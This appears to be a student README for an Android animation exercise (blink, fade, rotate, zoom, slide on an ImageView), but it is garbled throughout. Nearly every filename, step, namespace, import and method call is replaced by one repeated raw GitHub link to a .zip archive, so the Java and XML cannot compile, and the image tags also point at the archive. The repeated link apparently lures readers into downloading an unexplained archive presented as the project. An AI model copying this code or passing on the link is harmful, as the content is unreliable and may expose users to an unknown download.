# https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip 11 Develop a application to add animations to ImageView,Move,blink,fade,clockwise,zoom,slide operations are perform in android studio.


## AIM:

To develop a application to add animation to imageview,move,blink,fade,clockwise,zoom,slide operation using Android Studio.

## EQUIPMENTS REQUIRED:

Android Studio(Latest Version)

## ALGORITHM:

https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip a new Android project in Android Studio.
https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip UI elements (TextView, ImageView, Buttons) in https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip animations in the res/anim directory (https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip, https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip, https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip, https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip, etc.).
https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip the animation logic in https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip by loading and applying the animations to the ImageView.
https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip buttons to their respective animation methods using the onClick attribute.
https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip the app to verify the animations.

## PROGRAM:
```
/*
Program to display animation operation”.
Developed by: SHAIK MUFEEZUR RAHAMAN
Registeration Number : 212221043007
*/
```


## In https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
    xmlns:tools="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    xmlns:app="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
    android:paddingLeft="20dp"
    android:paddingRight="20dp"
    android:paddingTop="20dp"
    android:paddingBottom="20dp"
    tools:context=".MainActivity">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Animation"
        android:id="@+id/textView"
        android:textSize="35dp"
        android:layout_alignParentTop="true"
        android:layout_centerHorizontal="true"
        />

    <ImageView
        android:id="@+id/imageView"
        android:layout_width="20dp"
        android:layout_height="100dp"
        android:paddingTop="10dp"
        android:layout_below="@+id/textView"
        android:layout_alignRight="@+id/textView"
        android:layout_alignEnd="@+id/textView"
        android:layout_alignLeft="@+id/textView"
        android:layout_alignStart="@+id/textView"
        app:srcCompat="@android:drawable/btn_star_big_on" />
    <Button
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="zoom"
        android:id="@+id/button"
        android:layout_below="@+id/imageView"
        android:layout_alignParentLeft="true"
        android:layout_alignParentStart="true"
        android:layout_marginTop="40dp"
        android:onClick="clockwise"/>

    <Button
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="clockwise"
        android:id="@+id/button2"
        android:layout_alignTop="@+id/button"
        android:layout_centerHorizontal="true"
        android:onClick="zoom"/>

    <Button
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="fade"
        android:id="@+id/button3"
        android:layout_alignTop="@+id/button2"
        android:layout_alignParentRight="true"
        android:layout_alignParentEnd="true"
        android:onClick="fade"/>

    <Button
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="blink"
        android:onClick="blink"
        android:id="@+id/button4"
        android:layout_below="@+id/button"
        android:layout_alignParentLeft="true"
        android:layout_alignParentStart="true" />


    <Button
        android:id="@+id/button6"
        android:layout_width="119dp"
        android:layout_height="wrap_content"
        android:layout_below="@+id/button3"
        android:layout_marginStart="-138dp"
        android:layout_marginLeft="-138dp"
        android:layout_marginTop="9dp"
        android:layout_toEndOf="@+id/textView"
        android:layout_toRightOf="@+id/textView"
        android:onClick="slide"
        android:text="slide" />

</RelativeLayout>

```

## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
```
package https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;

import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;

import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;

import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;
import https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip;


public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(savedInstanceState);
        setContentView(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
    }

    public void clockwise(View view){
        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        Animation animation = https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(),
                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation);
    }

    public void zoom(View view){
        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        Animation animation1 = https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(),
                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation1);
    }

    public void fade(View view){
        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        Animation animation1 =
                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(),
                        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation1);
    }

    public void blink(View view){
        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        Animation animation1 =
                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(),
                        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation1);
    }



    public void slide(View view){
        ImageView image = (ImageView)findViewById(https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        Animation animation1 =
                https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(getApplicationContext(), https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip);
        https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip(animation1);
    }
}

```
## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
```
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip">
    <alpha android:fromAlpha="0.0"
        android:toAlpha="1.0"
        android:interpolator="@android:anim/accelerate_interpolator"
        android:duration="500"
        android:repeatMode="reverse"
        android:repeatCount="infinite"/>
</set>
```
## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
```
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip">

    <rotate xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
        android:fromDegrees="0"
        android:toDegrees="360"
        android:pivotX="50%"
        android:pivotY="50%"
        android:duration="5000" >
    </rotate>

    <rotate xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
        android:startOffset="5000"
        android:fromDegrees="360"
        android:toDegrees="0"
        android:pivotX="50%"
        android:pivotY="50%"
        android:duration="5000" >
    </rotate>
</set>

```
## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
```
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
    android:interpolator="@android:anim/accelerate_interpolator">

    <alpha
        android:duration="1000"
        android:fromAlpha="0"
        android:toAlpha="1" />

    <alpha
        android:duration="1000"
        android:fromAlpha="1"
        android:startOffset="2000"
        android:toAlpha="0" />

</set>

```
## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
```
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip">
    <scale xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
        android:fromXScale="0.5"
        android:toXScale="3.0"
        android:fromYScale="0.5"
        android:toYScale="3.0"
        android:duration="5000"
        android:pivotX="50%"
        android:pivotY="50%" >
    </scale>

    <scale xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
        android:startOffset="5000"
        android:fromXScale="3.0"
        android:toXScale="0.5"
        android:fromYScale="3.0"
        android:toYScale="0.5"
        android:duration="5000"
        android:pivotX="50%"
        android:pivotY="50%" >
    </scale>
</set>

```

## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip

```
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
    android:fillAfter="true" >
    <scale
        android:duration="500"
        android:fromXScale="1.0"
        android:fromYScale="1.0"
        android:interpolator="@android:anim/linear_interpolator"
        android:toXScale="1.0"
        android:toYScale="0.0" />
</set>

```
## https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip
```
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip"
    android:fillAfter="true" >

    <scale
        android:duration="500"
        android:fromXScale="1.0"
        android:fromYScale="1.0"
        android:interpolator="@android:anim/linear_interpolator"
        android:toXScale="1.0"
        android:toYScale="0.0" />
</set>

```


## OUTPUT


<img src="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip" width=200>

<img src="https://raw.githubusercontent.com/githubmufeez45/Ex_11_ANIMATION/main/barbal/Ex_11_ANIMATION.zip" width=200>



## RESULT


The application was successfully developed to add animations (move, blink, fade, clockwise, zoom, and slide) to an ImageView. Upon interacting with the UI, the animations are applied as expected.
